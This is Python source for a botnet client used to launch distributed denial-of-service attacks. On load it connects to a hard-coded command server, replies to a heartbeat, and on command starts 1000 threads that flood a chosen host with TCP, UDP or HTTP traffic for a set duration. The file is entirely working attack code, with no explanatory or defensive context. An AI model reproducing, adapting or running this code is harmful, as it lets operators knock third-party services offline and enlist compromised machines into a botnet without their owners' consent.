import socket
import threading
import time
import os

class AttackInfo:

    def __init__(self, addr, port, duration):
        self.addr = addr
        self.port = port
        self.duration = duration
        self.stop = None

    def _attack_(self):
        return

    def _threads_(self):
        for _ in range(1000):
            threading.Thread(
                target=self._attack_,
                daemon=True
            ).start()

    def run(self):
        try:
            socket.gethostbyname(self.addr)
        except Exception:
            return
        
        self._threads_()
        t = time.time()

        while time.time() - t < self.duration:
            time.sleep(1)

        self.stop = True

class Tcp(AttackInfo):

    def __init__(self, addr, port, duration):
        super().__init__(addr, port, duration)
    
    def _attack_(self):

        while not self.stop:
            try:
                s = socket.socket()
                s.connect((self.addr, self.port))

                for _ in range(5):
                    s.send(os.urandom(32))

                s.close()
            except Exception:
                pass

class Udp(AttackInfo):

    def __init__(self, addr, port, duration):
        super().__init__(addr, port, duration)
    
    def _attack_(self):

        while not self.stop:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((self.addr, self.port))

                for _ in range(5):
                    s.send(os.urandom(32))

                s.close()
            except Exception:
                pass

class Http(AttackInfo):

    def __init__(self, addr, port, duration):
        super().__init__(addr, port, duration)
        self.payload = f'GET / HTTP/1.1\r\nHost: {self.addr}\r\nConnection: close\r\n\r\n'.encode()

    def _attack_(self):
        while not self.stop:
            try:
                s = socket.socket()
                s.connect((self.addr, self.port))
                s.send(self.payload)
                s.close()
            except Exception:
                pass

class Bot:

    def __init__(self, addr, port):
        self.addr = addr
        self.port = port
        self.sock = None
        self.handler()

    def recv(self):
        return self.sock.recv(1024).decode()
    
    def send(self, buff: str):
        return self.sock.send(buff.encode())
    
    def connect(self):
        self.sock = socket.socket()
        self.sock.connect((self.addr, self.port))
    
    def handler(self):
        while 1:
            try:
                self.connect()

                while 1:
                    args = self.recv().split('|')
                    size = len(args)

                    if not args:
                        continue

                    cmd = args[0]

                    if cmd == 'tiny':
                        self.send('tall')
                    elif cmd == 'tcp' and size == 4:
                        Tcp(args[1], int(args[2]), int(args[3])).run()
                    elif cmd == 'udp' and size == 4:
                        Udp(args[1], int(args[2]), int(args[3])).run()
                    elif cmd == 'http' and size == 4:
                        Http(args[1], int(args[2]), int(args[3])).run()

            except Exception:
                pass

    def run(self):
        self.handler()

Bot('192.168.1.41', 5556)